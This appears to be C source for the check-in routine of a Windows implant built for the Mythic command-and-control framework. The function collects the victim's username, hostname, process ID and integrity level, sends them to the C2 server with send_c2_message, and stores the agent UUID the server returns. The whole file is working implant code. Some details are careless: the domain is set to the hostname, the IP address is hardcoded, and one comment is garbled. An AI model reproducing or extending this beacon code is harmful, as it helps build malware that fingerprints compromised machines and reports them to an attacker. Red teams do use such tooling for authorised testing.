#include "Checkin.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// External Dependencies from main.c (should be moved to separate headers
// eventually)
extern char current_uuid[128];
#include "utils.h"

#include <windows.h>

BOOL CheckinSend(char *override_user) {
  char json_msg[4096];
  DWORD mypid = GetCurrentProcessId();

  char username[512];
  if (override_user != NULL) {
    strncpy(username, override_user, sizeof(username) - 1);
  } else {
    DWORD username_len = sizeof(username);
    if (!GetUserNameA(username, &username_len)) {
      strncpy(username, "UNKNOWN", sizeof(username));
    }
  }

  char hostname[256];
  DWORD hostname_len = sizeof(hostname);
  if (!GetComputerName(hostname, &hostname_len)) {
    strncpy(hostname, "UNKNOWN", sizeof(hostname));
  }

  // Clean up username/hostname (sometimes contain garbage if buffer verified
  // strictly?) GetUserName returns null-terminated string.

  int integrity = get_integrity_level();

  char *escaped_user = json_escape(username);
  char *escaped_host = json_escape(hostname);

  // Construct Checkin JSON
  snprintf(json_msg, sizeof(json_msg),
           "{\"action\": \"checkin\", \"uuid\": \"%s\", \"ips\": "
           "[\"127.0.0.1\"], \"os\": \"windows\", \"user\": \"%s\", "
           "\"host\": \"%s\", \"pid\": %lu, \"architecture\": \"x64\", "
           "\"domain\": \"%s\", \"integrity_level\": %d}",
           current_uuid, escaped_user, escaped_host, mypid, escaped_host,
           integrity);

  free(escaped_user);
  free(escaped_host);

  char *b64_resp = send_c2_message(json_msg);

  if (b64_resp && strlen(b64_resp) > 0) {
    char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));

    if (json_resp) {
      // Check for new UUID or success
      if (strstr(json_resp, "checkin") && strstr(json_resp, "\"id\"")) {
        char new_uuid[128] = {0};
        extract_json_string(json_resp, "id", new_uuid, sizeof(new_uuid));

        if (strlen(new_uuid) > 0) {
          strncpy(current_uuid, new_uuid, sizeof(current_uuid));
          // Checkin Successful
          free(json_resp);
          free(b64_resp);
          return TRUE;
        }
      }
      free(json_resp);
    }
    free(b64_resp);
    // If we got a response but no ID, it might strictly strictly mean failed?
    // Or maybe just ok. But for now return TRUE if we got a valid response?
    return TRUE;
  }

  return FALSE;
}
